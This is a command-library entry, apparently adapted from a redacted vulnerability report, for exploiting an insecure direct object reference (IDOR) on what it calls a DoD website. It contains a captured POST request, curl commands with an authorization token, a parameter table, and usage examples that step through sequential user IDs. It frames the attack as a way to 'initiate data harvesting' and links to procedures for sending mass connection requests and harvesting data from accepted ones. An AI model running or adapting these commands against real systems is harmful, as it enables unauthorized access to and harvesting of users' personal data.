---
id: cmd-uuid-001
data: >-
  POST /██████ HTTP/1.1

  Host: ██████████

  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101
  Firefox/74.0

  Accept: application/json, text/javascript, */*; q=0.01

  Accept-Language: en-US,en;q=0.5

  Accept-Encoding: gzip, deflate

  Content-Type: application/x-www-form-urlencoded; charset=UTF-8

  Authorization-Code: b6315c0b-3f28-4b63-93de-b6a5a1c3db82

  Rest-Authorization-Code: b6315c0b-3f28-4b63-93de-b6a5a1c3db82

  X-Requested-With: XMLHttpRequest

  Content-Length: 35

  Origin: https://█████████

  Connection: close

  Referer: https://██████/██████████

  Cookie: _ga=██████ ███; ██████████-Http-Session=███; googtrans=/en/en;
  UserName=█████ █████; ████████


  RequesteeId=████████&RequestMessage=+
tags:
  - idor
  - post-request
type: command
output: '{"Status": "Pending", "Id": 123}'
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.117Z'
verified: false
validated: true
submitted: true
---
# send-connection-request-idor

## Command

```bash
curl -X POST https://█████████/██████ \
  -H "Authorization-Code: b6315c0b-3f28-4b63-93de-b6a5a1c3db82" \
  -H "Rest-Authorization-Code: b6315c0b-3f28-4b63-93de-b6a5a1c3db82" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: UserName=█████ █████; ..." \
  -d "RequesteeId=123&RequestMessage=+"
```

## Description

This command sends a connection request to a target user ID on the DoD website, exploiting IDOR by using predictable RequesteeId without authorization. Use in authenticated sessions to initiate data harvesting.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| RequesteeId | Target user's sequential ID (e.g., 123) | Yes |
| RequestMessage | Optional message (e.g., '+' or empty) | No |
| Authorization-Code | Session auth token | Yes |
| Cookie | Includes UserName and session data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://█████████/██████ -H "Authorization-Code: token" -d "RequesteeId=1&RequestMessage=+"
```

### Advanced Usage

```bash
curl -X POST https://█████████/██████ -H "Authorization-Code: token" -H "Cookie: full_cookie_string" -d "RequesteeId=1000&RequestMessage=Connect"
```

## Expected Output

JSON response indicating request status, e.g., {"Status": "Pending", "Id": 123, "DisplayName": "User Name"} on acceptance.

## Related

- [[procedures/Sending-Mass-Connection-Requests]]
- [[procedures/Accessing-Accepted-Requests-for-Data-Harvesting]]
